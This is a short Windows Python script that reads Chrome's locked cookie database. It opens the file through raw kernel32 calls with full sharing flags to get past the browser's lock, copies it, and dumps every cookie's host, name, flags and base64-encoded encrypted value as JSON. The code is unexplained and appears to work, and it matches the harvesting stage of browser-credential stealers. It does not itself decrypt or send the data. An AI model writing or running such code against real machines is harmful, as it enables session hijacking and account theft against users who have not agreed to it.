import sys
import os
import json
import sqlite3
import tempfile
import base64
import ctypes
from ctypes import wintypes

def safe_copy_locked(src, dst):
    GENERIC_READ = 0x80000000
    FILE_SHARE_READ = 1
    FILE_SHARE_WRITE = 2
    FILE_SHARE_DELETE = 4
    OPEN_EXISTING = 3
    FILE_ATTRIBUTE_NORMAL = 0x80

    kernel32 = ctypes.windll.kernel32
    handle = kernel32.CreateFileW(
        src,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None
    )
    if handle == -1 or handle == 0xFFFFFFFFFFFFFFFF:
        return False

    CHUNK_SIZE = 64 * 1024
    buffer = ctypes.create_string_buffer(CHUNK_SIZE)
    bytes_read = wintypes.DWORD()

    with open(dst, 'wb') as f_out:
        while True:
            success = kernel32.ReadFile(handle, buffer, CHUNK_SIZE, ctypes.byref(bytes_read), None)
            if not success or bytes_read.value == 0:
                break
            f_out.write(buffer.raw[:bytes_read.value])

    kernel32.CloseHandle(handle)
    return True

def extract_cookies(profile_id="Default"):
    user_data = os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data')
    profile_path = os.path.join(user_data, profile_id)
    cookies_file = os.path.join(profile_path, 'Network', 'Cookies')
    
    if not os.path.exists(cookies_file):
        print(json.dumps([]))
        return

    tmp = tempfile.mktemp('.db')
    try:
        if not safe_copy_locked(cookies_file, tmp):
            print(json.dumps([]))
            return

        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, encrypted_value FROM cookies")
        rows = cursor.fetchall()
        
        results = []
        for host, name, path, is_secure, is_httponly, enc_val in rows:
            if enc_val:
                results.append({
                    "host": host,
                    "name": name,
                    "path": path,
                    "is_secure": bool(is_secure),
                    "is_httponly": bool(is_httponly),
                    "enc_val_b64": base64.b64encode(enc_val).decode('ascii')
                })
        conn.close()
        print(json.dumps(results))
    except Exception as e:
        print(json.dumps([]))
    finally:
        if os.path.exists(tmp):
            try:
                os.remove(tmp)
            except:
                pass

if __name__ == "__main__":
    p = sys.argv[1] if len(sys.argv) > 1 else "Default"
    extract_cookies(p)
